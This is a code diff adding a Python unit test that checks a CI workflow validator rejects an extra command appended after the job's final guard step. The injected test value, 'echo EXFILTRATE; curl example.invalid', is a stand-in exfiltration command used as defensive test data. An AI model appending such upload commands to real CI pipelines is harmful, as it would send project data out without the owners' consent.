@@ -64,6 +64,12 @@ class PublicQwenPhysicalContracts(unittest.TestCase):
         raw['jobs']['public-only-neural-forward']['steps'][-1]['run'] = 'true\n'
         with self.assertRaises(ValueError): self.check(yaml.safe_dump(raw, sort_keys=False))
 
+    def test_appended_upload_after_final_guard_rejected(self):
+        raw = yaml.safe_load(self.flow)
+        raw['jobs']['public-only-neural-forward']['steps'][-1]['run'] += '\necho EXFILTRATE; curl example.invalid\n'
+        with self.assertRaises(ValueError):
+            self.check(yaml.safe_dump(raw, sort_keys=False))
+
     def test_write_access_denied(self):
         raw = yaml.safe_load(self.flow)
         raw['permissions']['contents'] = 'write'
